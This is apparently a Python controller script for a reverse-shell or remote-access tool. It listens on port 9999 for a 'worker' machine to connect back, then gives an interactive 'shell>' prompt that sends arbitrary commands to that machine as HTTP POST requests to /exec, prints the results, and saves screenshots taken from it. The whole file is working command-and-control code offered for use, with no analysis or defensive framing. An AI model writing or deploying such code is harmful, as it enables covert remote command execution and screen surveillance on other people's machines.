import socket
from server_http import Server
from api import API
from request import Request
from response import Response

master = Server(api=API())
master.open(("0.0.0.0", 9999))
master.connection.listen(1)
print("[*] Waiting for worker...")
conn, addr = master.connection.accept()
master.connection.close()
print(f"[+] Worker connected from {addr}")
def recv_all(sock):
    raw = b""
    while True:
        raw += sock.recv(4096)
        if b"\r\n\r\n" in raw:
            header_part, _, body_part = raw.partition(b"\r\n\r\n")
            content_length = None
            for line in header_part.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    content_length = int(line.split(b":", 1)[1].strip())
                    break
            if content_length is None or len(body_part) >= content_length:
                break
    return raw

while True:
    cmd = input("shell> ").strip()
    if not cmd:
        continue
    conn.sendall(Request(method="POST", uri="/exec", body=cmd.encode()).dump())
    if cmd == "exit":
        break

    raw = recv_all(conn)
    response = Response.load(raw)

    if cmd.startswith("screenshot") and cmd.split()[2] == "master":
        path = cmd.split()[1]
        with open(path, "wb") as f:
            f.write(response.body)
        print(f"screenshot saved to {path}")
    else:
        print(response.body.decode(errors="replace"))

conn.close()